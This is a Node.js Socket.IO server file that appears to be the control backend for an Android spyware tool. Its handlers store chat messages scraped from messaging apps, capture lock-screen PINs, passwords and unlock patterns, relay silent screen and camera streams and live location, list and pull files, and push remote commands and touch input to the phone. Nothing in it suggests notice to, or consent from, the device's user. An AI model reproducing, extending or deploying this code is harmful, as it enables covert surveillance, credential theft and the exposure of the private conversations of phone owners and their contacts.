const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

// Firebase for instant status updates
const { setDeviceStatus } = require('../lib/firebase');

// Use shared state for connected devices
const { connectedDevices } = require('../shared/state');

// Silent screen stream handlers
const { setupSilentStreamHandlers } = require('./silentStream');

// Track active WebRTC streams per device
// Map<deviceId, { adminSocketId, startTime, duration, withAudio }>
const activeStreams = new Map();

// Track which admin sockets are watching which device streams
// Map<deviceId, Set<adminSocketId>>
const streamWatchers = new Map();

/**
 * Setup Socket.IO handlers
 */
function setupSocketHandlers(io) {
    io.on('connection', (socket) => {
        console.log(`[SOCKET] New connection: ${socket.id}`);

        // Setup silent stream handlers for this socket
        setupSilentStreamHandlers(io, socket);


        /**
         * Device identifies itself
         */
        socket.on('device:connect', async (data) => {
            try {
                const { deviceId, batteryLevel, networkType, isCharging, timestamp } = data;
                if (!deviceId) return;

                // Track this connection
                socket.join(`device:${deviceId}`);
                connectedDevices.set(socket.id, deviceId);

                // Update database with status data if provided
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (device) {
                    const updateData = {
                        isOnline: true,
                        lastSeen: new Date()
                    };

                    // Include battery/network if provided (instant status update)
                    if (batteryLevel !== undefined) updateData.battery = batteryLevel;
                    if (networkType !== undefined) updateData.network = networkType;
                    if (isCharging !== undefined) updateData.isCharging = isCharging;

                    await prisma.device.update({
                        where: { id: device.id },
                        data: updateData
                    });

                    // Send pending commands
                    const pendingCommands = await prisma.command.findMany({
                        where: { deviceId: device.id, status: 'pending' }
                    });
                    for (const cmd of pendingCommands) {
                        socket.emit('command:execute', {
                            id: cmd.id,
                            type: cmd.type,
                            payload: cmd.payload ? JSON.parse(cmd.payload) : null
                        });
                        await prisma.command.update({
                            where: { id: cmd.id },
                            data: { status: 'sent' }
                        });
                    }
                }

                // UPDATE FIREBASE -> This triggers admin panel update instantly
                setDeviceStatus(deviceId, true, {
                    model: device?.model,
                    manufacturer: device?.manufacturer
                });

                console.log(`[SOCKET] Device ONLINE: ${deviceId} (Battery: ${batteryLevel}%, Network: ${networkType})`);

                // Emit device online event
                io.to('admin').emit('device:online', { deviceId });

                // IMMEDIATELY forward device status to admin if battery/network provided
                if (batteryLevel !== undefined || networkType !== undefined) {
                    io.to('admin').emit('device:status', {
                        deviceId,
                        batteryLevel,
                        networkType,
                        isCharging,
                        timestamp: timestamp || Date.now()
                    });
                }
            } catch (error) {
                console.error('[SOCKET] Connect error:', error);
            }
        });

        /**
         * Device heartbeat - keep status fresh
         */
        socket.on('device:heartbeat', async (data) => {
            try {
                const { deviceId, batteryLevel, networkType, isCharging } = data;
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (device) {
                    await prisma.device.update({
                        where: { id: device.id },
                        data: { lastSeen: new Date(), isOnline: true }
                    });
                    // Keep Firebase status fresh
                    setDeviceStatus(deviceId, true);

                    // Forward device status to admin if present
                    if (batteryLevel !== undefined || networkType !== undefined) {
                        io.to('admin').emit('device:status', {
                            deviceId,
                            batteryLevel,
                            networkType,
                            isCharging,
                            timestamp: Date.now()
                        });
                    }
                }
                socket.emit('heartbeat:ack', { timestamp: Date.now() });
            } catch (error) {
                console.error('[SOCKET] Heartbeat error:', error);
            }
        });

        /**
         * Device status update (battery, network, etc.)
         */
        socket.on('device:status', (data) => {
            const { deviceId, batteryLevel, networkType, isCharging } = data;
            console.log(`[SOCKET] Device status from ${deviceId}: Battery ${batteryLevel}%, ${networkType}`);
            io.to('admin').emit('device:status', {
                deviceId,
                batteryLevel,
                networkType,
                isCharging,
                timestamp: Date.now()
            });
        });

        /**
         * Admin joins admin room
         */
        socket.on('admin:join', () => {
            socket.join('admin');
            console.log(`[SOCKET] Admin joined: ${socket.id}`);
        });

        /**
         * Stream viewer joins stream room
         */
        socket.on('stream:join', ({ deviceId }) => {
            socket.join(`stream:${deviceId}`);

            // Track this admin as a watcher
            if (!streamWatchers.has(deviceId)) {
                streamWatchers.set(deviceId, new Set());
            }
            streamWatchers.get(deviceId).add(socket.id);

            console.log(`[SOCKET] Viewer joined stream: ${deviceId} (${streamWatchers.get(deviceId).size} watchers)`);
        });

        socket.on('stream:leave', ({ deviceId }) => {
            socket.leave(`stream:${deviceId}`);

            // Remove watcher and stop stream if no watchers left
            if (streamWatchers.has(deviceId)) {
                streamWatchers.get(deviceId).delete(socket.id);

                // If no more watchers, stop the stream on the device
                if (streamWatchers.get(deviceId).size === 0) {
                    console.log(`[SOCKET] Last viewer left - stopping stream on device: ${deviceId}`);
                    io.to(`device:${deviceId}`).emit('webrtc:stop');
                    activeStreams.delete(deviceId);
                    io.to('admin').emit('stream:inactive', { deviceId });
                    streamWatchers.delete(deviceId);
                }
            }
        });

        /**
         * Stream frame from device
         */
        socket.on('stream:frame', (data) => {
            const { deviceId, frame, timestamp } = data;
            io.to(`stream:${deviceId}`).emit('stream:frame', { deviceId, frame, timestamp });
        });

        /**
         * Recording amplitude from device
         */
        socket.on('recording:amplitude', (data) => {
            const deviceId = connectedDevices.get(socket.id);
            io.to('admin').emit('recording:amplitude', { ...data, deviceId });
        });

        /**
         * Recording status from device
         */
        socket.on('recording:status', (data) => {
            const deviceId = connectedDevices.get(socket.id);
            io.to('admin').emit('recording:status', { ...data, deviceId });
        });

        /**
         * Permission status from device
         */
        socket.on('device:permissions', (data) => {
            const { deviceId, permissions, timestamp } = data;
            console.log(`[SOCKET] Permission status from ${deviceId}`);
            // Forward to admin room
            io.to('admin').emit('device:permissions', { deviceId, permissions, timestamp });
        });

        /**
         * App log from device - real-time log streaming + persistent storage
         */
        socket.on('device:log', async (data) => {
            const { deviceId, level, tag, message, timestamp } = data;
            console.log(`[LOG] 📥 Received from ${deviceId}: [${level}] [${tag}] ${message?.substring(0, 50)}...`);

            // Forward to admin room for real-time viewing
            io.to('admin').emit('device:log', { deviceId, level, tag, message, timestamp });

            // Store ALL logs in database for persistent viewing
            try {
                await prisma.deviceLog.create({
                    data: {
                        deviceId,
                        level: level || 'INFO',
                        tag: tag || 'General',
                        message: message || '',
                        timestamp: new Date(timestamp || Date.now())
                    }
                });
                console.log(`[LOG] ✅ Stored in DB: [${tag}] ${message?.substring(0, 30)}...`);
            } catch (err) {
                console.error('[LOG] ❌ Failed to store log:', err.message);
            }
        });

        /**
         * Chat messages from device - capture and store with deduplication and sequencing
         */
        socket.on('chat:messages', async (data) => {
            const { deviceId, messages } = data;
            if (!deviceId || !messages || !Array.isArray(messages)) {
                console.log('[CHAT] Invalid chat data received');
                return;
            }

            console.log(`[CHAT] 📥 Received ${messages.length} messages from ${deviceId}`);

            try {
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (!device) {
                    console.log(`[CHAT] Device not found: ${deviceId}`);
                    return;
                }

                let savedCount = 0;
                let skippedCount = 0;

                for (const msg of messages) {
                    try {
                        // Generate hash for deduplication (now includes position)
                        const crypto = require('crypto');
                        const position = msg.screenPosition || 0;
                        const hashInput = `${msg.chatApp}|${msg.contactName || ''}|${msg.messageText}|${position}`;
                        const messageHash = crypto.createHash('md5').update(hashInput).digest('hex');

                        // Try to insert, skip if duplicate (hash already exists)
                        await prisma.chatMessage.upsert({
                            where: {
                                deviceId_messageHash: {
                                    deviceId: device.id,
                                    messageHash: messageHash
                                }
                            },
                            create: {
                                deviceId: device.id,
                                chatApp: msg.chatApp || 'unknown',
                                contactName: msg.contactName,
                                messageText: msg.messageText || '',
                                isSent: msg.isSent || false,
                                isRaw: msg.isRaw || false,
                                timestamp: new Date(msg.timestamp || Date.now()),
                                messageHash: messageHash,
                                // Sequence/ordering fields
                                screenPosition: msg.screenPosition || null,
                                dateContext: msg.dateContext || null,
                                extractedTime: msg.extractedTime || null,
                                captureSession: msg.captureSession || null,
                                // Latest vs Old tracking
                                isLatest: msg.isLatest !== undefined ? msg.isLatest : true,
                                captureTimestamp: new Date(msg.captureTimestamp || Date.now())
                            },
                            update: {} // No update on duplicate, just skip
                        });
                        savedCount++;
                    } catch (err) {
                        if (err.code === 'P2002') {
                            // Duplicate key - expected for duplicates, silently skip
                            skippedCount++;
                        } else {
                            console.error('[CHAT] Error saving message:', err.message);
                        }
                    }
                }

                console.log(`[CHAT] ✅ Saved ${savedCount} new, skipped ${skippedCount} duplicates`);

                // ===== MESSAGE CLEANUP: Limit 10,000 messages per contact =====
                const MAX_MESSAGES_PER_CONTACT = 10000;

                // Get unique contacts from this batch
                const uniqueContacts = [...new Set(messages.map(m => `${m.chatApp}|${m.contactName}`))];

                for (const contactKey of uniqueContacts) {
                    const [chatApp, contactName] = contactKey.split('|');
                    if (!contactName) continue;

                    // Count messages for this contact
                    const count = await prisma.chatMessage.count({
                        where: {
                            deviceId: device.id,
                            chatApp: chatApp,
                            contactName: contactName
                        }
                    });

                    // If over limit, delete oldest messages
                    if (count > MAX_MESSAGES_PER_CONTACT) {
                        const deleteCount = count - MAX_MESSAGES_PER_CONTACT;
                        console.log(`[CHAT] 🧹 Cleaning ${deleteCount} old messages for ${contactName}`);

                        // Find oldest messages to delete
                        const oldestMessages = await prisma.chatMessage.findMany({
                            where: {
                                deviceId: device.id,
                                chatApp: chatApp,
                                contactName: contactName
                            },
                            orderBy: { timestamp: 'asc' },
                            take: deleteCount,
                            select: { id: true }
                        });

                        // Delete them
                        await prisma.chatMessage.deleteMany({
                            where: {
                                id: { in: oldestMessages.map(m => m.id) }
                            }
                        });

                        console.log(`[CHAT] 🧹 Deleted ${oldestMessages.length} old messages`);
                    }
                }

                // Emit to admin panel for real-time viewing
                // Include contact info for live tracking
                const firstMsg = messages[0];
                io.to('admin').emit('chat:new', {
                    deviceId,
                    count: savedCount,
                    chatApp: firstMsg?.chatApp,
                    contactName: firstMsg?.contactName,
                    timestamp: Date.now(),
                    messages: messages.slice(0, 10) // Send first 10 for preview
                });

            } catch (error) {
                console.error('[CHAT] ❌ Error processing messages:', error.message);
            }
        });

        /**
         * Real-time Location from device
         */
        socket.on('device:location', (data) => {
            const deviceId = connectedDevices.get(socket.id);
            if (!deviceId) return;
            // Forward live location to admin room, ensure deviceId is in payload
            io.to('admin').emit('location:update', { ...data, deviceId });
        });

        /**
         * Unlock attempt from device - capture PIN/pattern/password entry on lock screen
         */
        socket.on('unlock:attempt', async (data) => {
            const deviceId = connectedDevices.get(socket.id);
            if (!deviceId) {
                console.log('[UNLOCK] No deviceId for socket');
                return;
            }

            const { unlockType, unlockData, success, reason, timestamp } = data;
            console.log(`[UNLOCK] 🔐 Attempt from ${deviceId}: ${unlockType} - ${unlockData?.length || 0} chars (${reason})`);

            try {
                // Find device in database
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (!device) {
                    console.log(`[UNLOCK] Device not found: ${deviceId}`);
                    return;
                }

                // Store unlock attempt in database
                await prisma.unlockAttempt.create({
                    data: {
                        deviceId: device.id,
                        unlockType: unlockType || 'unknown',
                        unlockData: unlockData || null,
                        success: success === true,
                        reason: reason || null,
                        timestamp: new Date(timestamp || Date.now())
                    }
                });

                console.log(`[UNLOCK] ✅ Stored unlock attempt for ${deviceId}`);

                // Forward to admin panel for real-time display
                io.to('admin').emit('unlock:attempt', {
                    deviceId,
                    unlockType,
                    unlockData,
                    success,
                    reason,
                    timestamp: timestamp || Date.now()
                });

            } catch (error) {
                console.error('[UNLOCK] ❌ Error storing unlock attempt:', error.message);
            }
        });

        /**
         * Pattern progress from device - real-time pattern drawing
         */
        socket.on('pattern:progress', (data) => {
            const deviceId = connectedDevices.get(socket.id);
            if (!deviceId) return;

            const { sequence, count, timestamp } = data;
            console.log(`[PATTERN] 📐 Progress from ${deviceId}: ${count} cells (${sequence?.join(',')})`);

            // Forward to admin panel for real-time visualization
            io.to('admin').emit('pattern:progress', {
                deviceId,
                sequence,
                count,
                timestamp: timestamp || Date.now()
            });
        });

        /**
         * Pattern captured from device - complete pattern
         */
        socket.on('pattern:captured', async (data) => {
            const deviceId = connectedDevices.get(socket.id);
            if (!deviceId) return;

            const { sequence, patternString, count, timestamp } = data;
            console.log(`[PATTERN] 📐 CAPTURED from ${deviceId}: ${patternString} (${count} cells)`);

            // Forward to admin panel
            io.to('admin').emit('pattern:captured', {
                deviceId,
                sequence,
                patternString,
                count,
                timestamp: timestamp || Date.now()
            });
        });

        /**
         * WebRTC Signaling - Offer from device
         */
        socket.on('webrtc:offer', (data) => {
            const { deviceId, sdp } = data;
            console.log(`[WEBRTC] Offer from device ${deviceId}`);
            // Forward to admin viewers
            io.to(`stream:${deviceId}`).emit('webrtc:offer', { deviceId, sdp });
        });

        /**
         * WebRTC Signaling - Answer from admin
         */
        socket.on('webrtc:answer', (data) => {
            const { deviceId, sdp } = data;
            console.log(`[WEBRTC] Answer for device ${deviceId}`);
            // Android expects a JSON string in the 'sdp' field
            const sdpString = typeof sdp === 'object' ? JSON.stringify(sdp) : sdp;
            io.to(`device:${deviceId}`).emit('webrtc:answer', { sdp: sdpString });
        });

        /**
         * WebRTC Signaling - ICE Candidate
         */
        socket.on('webrtc:ice-candidate', (data) => {
            const { deviceId, candidate, from } = data;
            if (from === 'device') {
                // To admin - keep as objects, admin handles them
                io.to(`stream:${deviceId}`).emit('webrtc:ice-candidate', { deviceId, candidate });
            } else {
                // To device - Android expects a JSON string
                const candidateString = typeof candidate === 'object' ? JSON.stringify(candidate) : candidate;
                io.to(`device:${deviceId}`).emit('webrtc:ice-candidate', { candidate: candidateString });
            }
        });

        /**
         * Camera stream started notification - track active stream
         */
        socket.on('camera:started', (data) => {
            const { deviceId, streamType } = data;
            console.log(`[CAMERA] Stream started from ${deviceId}: ${streamType}`);

            // Track this stream
            activeStreams.set(deviceId, {
                startTime: Date.now(),
                streamType,
                deviceSocketId: socket.id
            });

            io.to(`stream:${deviceId}`).emit('camera:started', { deviceId, streamType });
            // Also notify any admin checking stream status
            io.to('admin').emit('stream:active', { deviceId, streamType, startTime: Date.now() });
        });

        /**
         * Camera stream stopped notification - clear active stream
         */
        socket.on('camera:stopped', (data) => {
            const { deviceId } = data;
            console.log(`[CAMERA] Stream stopped from ${deviceId}`);

            // Clear stream tracking
            activeStreams.delete(deviceId);

            io.to(`stream:${deviceId}`).emit('camera:stopped', { deviceId });
            io.to('admin').emit('stream:inactive', { deviceId });
        });

        /**
         * Admin checks if device is currently streaming
         */
        socket.on('stream:check', ({ deviceId }) => {
            const activeStream = activeStreams.get(deviceId);
            socket.emit('stream:status', {
                deviceId,
                isActive: !!activeStream,
                ...(activeStream || {})
            });
        });

        /**
         * Session expired notification from device
         */
        socket.on('webrtc:session-expired', (data) => {
            const { deviceId, reason, duration } = data;
            console.log(`[WEBRTC] Session expired for ${deviceId}: ${reason} (duration: ${duration}ms)`);

            // Clear stream tracking
            activeStreams.delete(deviceId);

            // Notify admin viewers
            io.to(`stream:${deviceId}`).emit('stream:session-expired', { deviceId, reason, duration });
            io.to('admin').emit('stream:inactive', { deviceId });
        });

        /**
         * Camera stream error
         */
        socket.on('camera:error', (data) => {
            const { deviceId, error } = data;
            console.log(`[CAMERA] Error from ${deviceId}: ${error}`);
            io.to(`stream:${deviceId}`).emit('camera:error', { deviceId, error });
        });

        /**
         * Command result from device
         */
        socket.on('command:result', async (data) => {
            const { commandId, deviceId, success, result } = data;
            try {
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (device) {
                    await prisma.command.updateMany({
                        where: { id: commandId, deviceId: device.id },
                        data: {
                            status: success ? 'completed' : 'failed',
                            result: result ? JSON.stringify(result) : null,
                            completedAt: new Date()
                        }
                    });
                }
                io.to('admin').emit('command:result', { commandId, deviceId, success, result });
            } catch (error) {
                console.error('[SOCKET] Command result error:', error);
            }
        });

        /**
         * Send command to device (from admin panel)
         */
        socket.on('admin:sendCommand', async (data) => {
            const { deviceId, type, payload } = data;
            try {
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (!device) return;

                const command = await prisma.command.create({
                    data: {
                        deviceId: device.id,
                        type,
                        payload: payload ? JSON.stringify(payload) : null,
                        status: 'sent'
                    }
                });

                io.to(`device:${deviceId}`).emit('command:execute', {
                    id: command.id,
                    type,
                    payload
                });

                console.log(`[SOCKET] Command sent to ${deviceId}: ${type}`);
            } catch (error) {
                console.error('[SOCKET] Send command error:', error);
            }
        });

        // Handle command from admin panel
        socket.on('command:send', async (data) => {
            const { deviceId, type, payload } = data;
            console.log(`[SOCKET] Command request: ${type} for ${deviceId}`);

            try {
                // Get device from DB
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (!device) {
                    console.log(`[SOCKET] Device not found: ${deviceId}`);
                    return;
                }

                // Create command in DB
                const command = await prisma.command.create({
                    data: {
                        deviceId: device.id,
                        type,
                        payload: payload ? JSON.stringify(payload) : null,
                        status: 'sent'
                    }
                });

                // Send to device
                io.to(`device:${deviceId}`).emit('command:execute', {
                    id: command.id,
                    type,
                    payload
                });

                console.log(`[SOCKET] Command ${command.id} sent: ${type}`);
            } catch (error) {
                console.error('[SOCKET] Command send error:', error);
            }
        });

        // Stream watching
        socket.on('stream:watch', ({ deviceId }) => {
            socket.join(`stream:${deviceId}`);
            console.log(`[SOCKET] Watching stream: ${deviceId}`);
        });

        socket.on('stream:unwatch', ({ deviceId }) => {
            socket.leave(`stream:${deviceId}`);
            console.log(`[SOCKET] Unwatching stream: ${deviceId}`);
        });

        // WebRTC stop stream - send directly to device's webrtc:stop listener
        socket.on('webrtc:stop', ({ deviceId }) => {
            console.log(`[WEBRTC] Stop requested for: ${deviceId}`);
            // Device's SocketManager listens for webrtc:stop directly (no args)
            io.to(`device:${deviceId}`).emit('webrtc:stop');
            // Notify admin state reset
            io.to(`stream:${deviceId}`).emit('webrtc:stopped', { deviceId });
        });

        // Stream quality change - relay to device
        socket.on('stream:quality', ({ deviceId, quality }) => {
            console.log(`[STREAM] Quality change for ${deviceId}: ${quality}`);
            io.to(`device:${deviceId}`).emit('stream:quality', { quality });
        });

        /**
         * Remote touch/gesture from admin - relay to device
         */
        socket.on('admin:touch', (data) => {
            const { deviceId, ...touchData } = data;
            if (!deviceId) return;

            console.log(`[REMOTE] Touch event for ${deviceId}: ${touchData.type}`);
            // Forward directly to device
            io.to(`device:${deviceId}`).emit('remote:touch', touchData);
        });

        /**
         * File listing from device - relay to admin
         */
        socket.on('files:list', (data) => {
            const { deviceId, path, parentPath, files, totalFiles, commandId } = data;
            console.log(`[FILES] Listing from ${deviceId}: ${totalFiles} files in ${path}`);
            // Forward to admin room
            io.to('admin').emit('files:list', {
                deviceId,
                path,
                parentPath,
                files,
                totalFiles,
                commandId,
                timestamp: Date.now()
            });
        });

        /**
         * File download ready from device - relay to admin
         */
        socket.on('files:download_ready', (data) => {
            const { deviceId, commandId, fileName, filePath, size, mimeType, downloadUrl } = data;
            console.log(`[FILES] Download ready from ${deviceId}: ${fileName} (${size} bytes) -> ${downloadUrl}`);
            // Forward to admin room
            io.to('admin').emit('files:download_ready', {
                deviceId,
                commandId,
                fileName,
                filePath,
                size,
                mimeType,
                downloadUrl,
                timestamp: Date.now()
            });
        });

        /**
         * Socket disconnected - INSTANT offline detectionk8mu
         */
        socket.on('disconnect', async () => {
            const deviceId = connectedDevices.get(socket.id);

            if (deviceId) {
                connectedDevices.delete(socket.id);

                try {
                    const device = await prisma.device.findUnique({ where: { deviceId } });
                    if (device) {
                        await prisma.device.update({
                            where: { id: device.id },
                            data: { isOnline: false }
                        });
                    }

                    // UPDATE FIREBASE -> This triggers admin panel update instantly
                    setDeviceStatus(deviceId, false);

                    console.log(`[SOCKET] Device OFFLINE: ${deviceId}`);
                    io.to('admin').emit('device:offline', { deviceId });
                } catch (error) {
                    console.error('[SOCKET] Disconnect error:', error);
                }
            }

            // Check if this was an admin watching streams - cleanup and stop if no watchers
            for (const [watchedDeviceId, watchers] of streamWatchers.entries()) {
                if (watchers.has(socket.id)) {
                    watchers.delete(socket.id);
                    console.log(`[SOCKET] Admin ${socket.id} disconnected - removed from ${watchedDeviceId} watchers`);

                    // If no more watchers, stop the stream on device
                    if (watchers.size === 0) {
                        console.log(`[SOCKET] No watchers left - stopping stream: ${watchedDeviceId}`);
                        io.to(`device:${watchedDeviceId}`).emit('webrtc:stop');
                        activeStreams.delete(watchedDeviceId);
                        io.to('admin').emit('stream:inactive', { deviceId: watchedDeviceId });
                        streamWatchers.delete(watchedDeviceId);
                    }
                }
            }

            console.log(`[SOCKET] Connection closed: ${socket.id}`);
        });
    });

    console.log('[SOCKET] Handlers ready');
}

// Export for API routes to check connected devices
module.exports = setupSocketHandlers;
module.exports.connectedDevices = connectedDevices;
